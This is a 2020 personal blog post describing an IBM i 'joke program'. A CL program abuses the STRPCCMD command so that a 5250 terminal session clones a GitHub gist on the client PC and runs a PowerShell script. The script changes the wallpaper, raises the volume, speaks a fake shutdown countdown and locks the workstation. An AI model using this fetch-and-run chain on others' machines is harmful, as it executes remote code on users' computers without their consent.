<!doctype html><html lang=en-us>
<head>
<meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<title> IBM i Joke Program | Barrett Otte</title>
<link rel=canonical href=https://barrettotte.github.io/posts/2020/1/>
<meta name=viewport content="width=device-width,initial-scale=1">
<link rel=stylesheet href=https://barrettotte.github.io/css/styles.c05d68261bf086a9d7713c4f8a6215a3601608e267a816a7ee58f139b3d1aae51222aae2081c8e0c6bd35e1334773b7a16283022f31f92afd93bb37e5e822e66.css integrity="sha512-wF1oJhvwhqnXcTxPimIVo2AWCOJnqBan7ljxObPRquUSIqriCByODGvTXhM0dzt6FigwIvMfkq/ZO7N+XoIuZg==">
<link rel=stylesheet href=https://barrettotte.github.io/lib/font-awesome/css/all.min.css>
<link rel=stylesheet href=https://barrettotte.github.io/css/custom.css>
<link rel=preload href=https://barrettotte.github.io/lib/font-awesome/webfonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin=anonymous>
<link rel=preload href=https://barrettotte.github.io/lib/font-awesome/webfonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin=anonymous>
<link rel=preload href=https://barrettotte.github.io/lib/font-awesome/webfonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin=anonymous>
<link rel=preload href=https://barrettotte.github.io/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2 as=font type=font/woff2 crossorigin=anonymous>
<link rel=icon href=https://barrettotte.github.io/img/favicon.svg>
</head>
<body class="max-width mx-auto px3 py5 ltr">
<div class="content index py4"><header id=header>
<div id=title>
<h1><a href=https://barrettotte.github.io>Barrett Otte</a></h1>
<div id=subtitle>
<div class=subtitle-item><a href=https://github.com/barrettotte>Software Engineer</a></div>
<div class=subtitle-item>Tinkerer</div>
<div class=subtitle-item><a href=https://anilist.co/user/barrettotte/>Loser</a></div>
</div>
</div>
<div id=nav>
<div class=nav-item>
<a href=/>Home</a>
</div>
<div class=nav-item>
<a href=/projects>Projects</a>
</div>
<div class=nav-item>
<a href=/posts class=active>Posts</a>
</div>
<div class=nav-item>
<a href=/about>About</a>
</div>
<div class=nav-item>
<a href=https://raw.githubusercontent.com/barrettotte/Resume/master/barrettotte-resume.pdf target=_blank rel="noopener noreferrer">Resume</a>
</div>
<div class=nav-item>
<a href=/misc>Misc</a>
</div>
</div>
</header>
<article class=post>
<header>
<h1 class=posttitle>IBM i Joke Program</h1>
<div class=meta>
<span class=author>
<span>Barrett Otte</span>
</span>
<div class=postdate>
<time datetime="2020-02-20 00:00:00 +0000 UTC">2020-02-20</time>
</div>
<div class=article-read-time>
<i class="far fa-clock"></i>
2 minute read
</div>
</div>
</header>
<div class=content>
<p>My coworker found a really cool command called <code>STRPCCMD</code> that allows the
5250 emulator to execute commands on the client machine. So why not exploit it for a laugh&mldr;</p>
<p><code>joke.clle</code></p>
<pre tabindex=0><code>/* CALL BOLIB/JOKE */
/* Entry Path: C:\Users\Public\IBM\ClientSolutions */

PGM                                                              
   DCL VAR(&amp;gist) TYPE(*CHAR) LEN(60)                            
   DCL VAR(&amp;cmd)  TYPE(*CHAR) LEN(120)                           
                                                                 
   CHGVAR VAR(&amp;gist) VALUE('https://gist.github.com/' +          
             || 'b6654e5606831f13f48887de39d67723.git')          
                                                                 
   CHGVAR VAR(&amp;cmd) VALUE('cmd /c &quot;git clone ' || &amp;gist || ' x' +
                       || ' &amp; powershell x/joke.ps1&quot;')                           
                                                                 
   STRPCO PCTA(*NO)                                              
   MONMSG MSGID(IWS4010)                                         
   STRPCCMD PCCMD(&amp;cmd) PAUSE(*NO)                               
                               
ENDPGM
</code></pre><p><code>joke.ps1</code></p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ps1 data-lang=ps1><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span style=color:#75715e># This stupid script does the following:</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span style=color:#75715e>#   - Download Windows XP wallpaper from imgur</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span style=color:#75715e>#   - Set Windows volume on</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span style=color:#75715e>#   - Set wallpaper to previously downloaded wallpaper via win32 API (without needing to logoff)</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span style=color:#75715e>#   - Text to speech message</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span style=color:#75715e>#   - Lock computer</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span>$job = Start-Job -ScriptBlock {
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span>Add-Type -AssemblyName System.speech
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span>  <span style=color:#75715e># hit win32 API to actively update wallpaper, I&#39;m not smart enough to code this myself</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span>  <span style=color:#75715e># so here&#39;s the genius that actually did it</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span>  <span style=color:#75715e>#   https://stackoverflow.com/questions/9440135/powershell-script-from-shortcut-to-change-desktop/9440226#9440226</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span>Add-Type <span style=color:#e6db74>@&#34;
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span style=color:#e6db74>  using System;
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span style=color:#e6db74>  using System.Runtime.InteropServices;
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span style=color:#e6db74>  using Microsoft.Win32;
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span style=color:#e6db74>  namespace Wallpaper {
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span style=color:#e6db74>    public enum Style : int {
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span style=color:#e6db74>      Tile, Center, Stretch, NoChange
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span style=color:#e6db74>    }
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span style=color:#e6db74>    public class Setter {
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span style=color:#e6db74>      public const int SetDesktopWallpaper = 20;
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span style=color:#e6db74>      public const int UpdateIniFile = 0x01;
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span style=color:#e6db74>      public const int SendWinIniChange = 0x02;
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span style=color:#e6db74>      [DllImport(&#34;user32.dll&#34;, SetLastError = true, CharSet = CharSet.Auto)]
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span style=color:#e6db74>      private static extern int SystemParametersInfo (int uAction, int uParam, string lpvParam, int fuWinIni);
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span><span style=color:#e6db74>      public static void SetWallpaper ( string path, Wallpaper.Style style ) {
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span><span style=color:#e6db74>        SystemParametersInfo( SetDesktopWallpaper, 0, path, UpdateIniFile | SendWinIniChange );
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">31</span><span style=color:#e6db74>        RegistryKey key = Registry.CurrentUser.OpenSubKey(&#34;Control Panel\\Desktop&#34;, true);
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">32</span><span style=color:#e6db74>        switch(style){
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">33</span><span style=color:#e6db74>          case Style.Stretch :
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">34</span><span style=color:#e6db74>            key.SetValue(@&#34;WallpaperStyle&#34;, &#34;2&#34;) ; 
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">35</span><span style=color:#e6db74>            key.SetValue(@&#34;TileWallpaper&#34;, &#34;0&#34;) ;
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">36</span><span style=color:#e6db74>            break;
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">37</span><span style=color:#e6db74>          case Style.Center :
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">38</span><span style=color:#e6db74>            key.SetValue(@&#34;WallpaperStyle&#34;, &#34;1&#34;) ; 
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">39</span><span style=color:#e6db74>            key.SetValue(@&#34;TileWallpaper&#34;, &#34;0&#34;) ; 
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">40</span><span style=color:#e6db74>            break;
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">41</span><span style=color:#e6db74>          case Style.Tile :
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">42</span><span style=color:#e6db74>            key.SetValue(@&#34;WallpaperStyle&#34;, &#34;1&#34;) ; 
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">43</span><span style=color:#e6db74>            key.SetValue(@&#34;TileWallpaper&#34;, &#34;1&#34;) ;
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">44</span><span style=color:#e6db74>            break;
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">45</span><span style=color:#e6db74>          case Style.NoChange :
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">46</span><span style=color:#e6db74>            break;
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">47</span><span style=color:#e6db74>        }
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">48</span><span style=color:#e6db74>        key.Close();
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">49</span><span style=color:#e6db74>      }
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">50</span><span style=color:#e6db74>    }
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">51</span><span style=color:#e6db74>  }
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">52</span><span style=color:#e6db74>&#34;@</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">53</span>  <span style=color:#75715e># https://stackoverflow.com/questions/21355891/change-audio-level-from-powershell</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">54</span>  <span style=color:#66d9ef>Function</span> Set-Speaker($Volume){
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">55</span>    $wshShell = new-object -com wscript.shell
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">56</span>    1..50 | ForEach-Object {
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">57</span>      $wshShell.SendKeys(<span style=color:#66d9ef>[char]</span>174)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">58</span>    }
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">59</span>    1..$Volume | ForEach-Object { 
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">60</span>      $wshShell.SendKeys(<span style=color:#66d9ef>[char]</span>175)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">61</span>    } 
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">62</span>  }
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">63</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">64</span>  $img_path = <span style=color:#e6db74>&#34;c:/users/${env:UserName}/x.jpg&#34;</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">65</span>  Invoke-WebRequest <span style=color:#e6db74>&#39;https://i.imgur.com/hzuxXQb.jpg&#39;</span> -outfile $img_path
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">66</span>  <span style=color:#66d9ef>[Wallpaper.Setter]</span>::SetWallpaper($img_path, 0)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">67</span>  Set-Speaker(10)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">68</span>  
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">69</span>  <span style=color:#75715e># Change monitor display settings to &#39;clone&#39;, decided to take this out</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">70</span>  <span style=color:#75715e># displayswitch.exe /clone</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">71</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">72</span>  <span style=color:#66d9ef>[System.Console]</span>::Beep(550, 1200)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">73</span>  <span style=color:#75715e># https://www.pdq.com/blog/powershell-text-to-speech-examples/</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">74</span>  $tts = New-Object -TypeName System.Speech.Synthesis.SpeechSynthesizer
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">75</span>  $tts.Rate = -2
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">76</span>  $tts.Speak(<span style=color:#e6db74>&#39;Now executing power down sis on GMCC 400&#39;</span>)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">77</span>  $tts.Speak(<span style=color:#e6db74>&#39;5&#39;</span>); $tts.Speak(<span style=color:#e6db74>&#39;4&#39;</span>); $tts.Speak(<span style=color:#e6db74>&#39;3&#39;</span>); $tts.Speak(<span style=color:#e6db74>&#39;2&#39;</span>); $tts.Speak(<span style=color:#e6db74>&#39;1&#39;</span>); 
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">78</span>  <span style=color:#66d9ef>[System.Console]</span>::Beep(550, 1200)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">79</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">80</span>  <span style=color:#75715e># eh...window spamming isn&#39;t really that fun</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">81</span>  <span style=color:#75715e>#for ($i = 1; $i -le 10; $i++){</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">82</span>  <span style=color:#75715e>#  [System.Threading.Thread]::Sleep(100)</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">83</span>  <span style=color:#75715e>#  &#34;[$i of 100]`n`n:(&#34; &gt; &#34;./x.txt&#34;</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">84</span>  <span style=color:#75715e>#  Start-Process notepad &#34;./x.txt&#34; #-Wait -WindowStyle Maximized</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">85</span>  <span style=color:#75715e>#}</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">86</span>}
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">87</span>Wait-Job $job | Out-Null
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">88</span>Receive-Job $job | Out-Null
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">89</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">90</span>rundll32.exe user32.dll, LockWorkStation
</code></pre></div><p>This was a lot of fun to make, but I honestly couldn&rsquo;t bring myself to prank
the more veteran IBM i developers at my company.</p>
<p>full gist - <a href=https://gist.github.com/barrettotte/b6654e5606831f13f48887de39d67723>https://gist.github.com/barrettotte/b6654e5606831f13f48887de39d67723</a></p>
</div>
</article>
<footer id=footer>
<div class=footer-left>
&copy; 2022
<a href=/>Barrett Otte</a>
</div>
<div class=footer-right>
<nav>
<ul>
<li>
<a class=icon target=_blank rel=noopener href=mailto:barrettotte@gmail.com>
<i class="fas fa-lg fa-envelope"></i>
</a>
</li>
<li>
<a class=icon target=_blank rel=noopener href=https://github.com/barrettotte>
<i class="fab fa-lg fa-github"></i>
</a>
</li>
<li>
<a class=icon target=_blank rel=noopener href=https://www.linkedin.com/in/barrettotte/>
<i class="fab fa-lg fa-linkedin"></i>
</a>
</li>
<li>
<a class=icon target=_blank rel=noopener href="https://news.ycombinator.com/user?id=barrettotte">
<i class="fab fa-lg fa-hacker-news-square"></i>
</a>
</li>
</ul>
</nav>
</div>
</footer>
</div>
</body>
<link rel=stylesheet href=/lib/font-awesome/css/all.min.css>
<script src=/lib/jquery/jquery.min.js></script>
<script src=/js/code-copy.js></script>
</html>